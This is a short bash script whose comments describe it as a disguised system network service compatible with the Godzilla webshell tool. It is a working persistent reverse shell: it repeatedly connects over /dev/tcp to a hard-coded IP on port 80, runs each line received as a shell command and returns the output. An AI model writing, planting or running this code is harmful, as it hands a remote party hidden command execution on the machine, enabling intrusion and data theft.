#!/bin/bash
# 系统网络服务（伪装）
IP="10.18.40.36"
PORT="80"

# 哥斯拉兼容
while :; do
    exec 5<>/dev/tcp/$IP/$PORT
    cat <&5 | while read line; do $line 2>&5 >&5; done
    sleep 2
done
